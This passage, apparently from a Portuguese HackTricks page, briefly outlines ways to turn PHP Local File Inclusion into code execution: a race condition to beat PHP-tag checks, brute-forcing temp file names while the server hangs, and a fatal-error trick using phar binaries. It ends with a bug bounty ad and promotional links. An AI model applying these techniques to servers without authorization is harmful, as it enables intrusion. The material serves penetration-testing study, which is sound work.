Se você encontrou uma **Inclusão Local de Arquivos** e você **pode extrair o caminho** do arquivo temporário, MAS o **servidor** está **verificando** se o **arquivo a ser incluído tem marcas PHP**, você pode tentar **burlar essa verificação** com essa **Condição de Corrida**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Via espera eterna + força bruta

Se você puder abusar da LFI para **fazer upload de arquivos temporários** e fazer o servidor **ficar pendurado** na execução do PHP, você pode então **forçar nomes de arquivos por horas** para encontrar o arquivo temporário:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Para Erro Fatal

Se você incluir qualquer um dos arquivos `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Você precisa incluir o mesmo duas vezes para gerar esse erro).

**Eu não sei como isso é útil, mas pode ser.**\
_Mesmo que você cause um Erro Fatal do PHP, os arquivos temporários enviados pelo PHP são excluídos._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## Referências

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
[PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof é o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof são lançadas apenas quando seus clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.

**Adquira experiência em pentesting web3**\
Protocolos blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.

**Torne-se uma lenda hacker web3**\
Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
